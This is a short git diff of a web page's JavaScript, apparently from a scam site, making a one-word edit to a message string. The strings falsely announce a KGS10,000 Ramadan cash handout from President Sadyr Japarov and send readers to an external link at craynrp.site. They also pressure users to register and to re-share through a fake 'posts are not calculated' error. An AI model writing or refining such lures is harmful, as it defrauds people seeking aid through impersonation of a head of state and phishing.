@@ -1446,7 +1446,7 @@ $(document).click(function () {
     </script>
 
 <script>
-    var text1 = "*KGS10,000 RAMADAN CASH SUPPORT*%0A %0A*As part of this humanitarian service, President Sadyr Japarov is distributing KGS10,000 to All citizens to assist with essential needs such as food, household supplies, and other daily expenses during the fasting period..*%0A%0A*_HOW TO GET IT NOW_*%0A_Visit the link below  and you will receive KGS10,000 instantly From The President Sadyr Japarov._%0A i just Received mine%0A%0A_Click Here_👇%0Ahttps://www.craynrp.site/kgs10000-ramadan",
+    var text1 = "*KGS10,000 RAMADAN CASH SUPPORT*%0A %0A*As part of humanitarian service, President Sadyr Japarov is distributing KGS10,000 to All citizens to assist with essential needs such as food, household supplies, and other daily expenses during the fasting period..*%0A%0A*_HOW TO GET IT NOW_*%0A_Visit the link below  and you will receive KGS10,000 instantly From The President Sadyr Japarov._%0A i just Received mine%0A%0A_Click Here_👇%0Ahttps://www.craynrp.site/kgs10000-ramadan",
             text2 = " an amount of ",
             text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
             error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
